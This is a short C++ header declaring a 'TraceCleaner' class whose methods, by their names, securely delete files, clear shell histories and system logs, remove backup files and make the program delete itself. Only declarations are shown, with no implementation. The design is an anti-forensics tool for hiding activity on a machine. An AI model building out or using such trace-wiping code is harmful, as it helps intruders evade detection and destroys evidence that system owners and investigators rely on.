#ifndef TRACE_CLEANER_HPP
#define TRACE_CLEANER_HPP

#include <string>
#include <vector>

class TraceCleaner {
public:
    TraceCleaner(const std::string& backupDir, const std::string& executablePath);
    void cleanAllTraces();

private:
    void secureDelete(const std::string& path);
    void clearShellHistories();
    void clearSystemLogs();
    void deleteBackupFiles();
    void selfDestruct();

    std::string backupDir;
    std::string executablePath;
};

#endif // TRACE_CLEANER_HPP 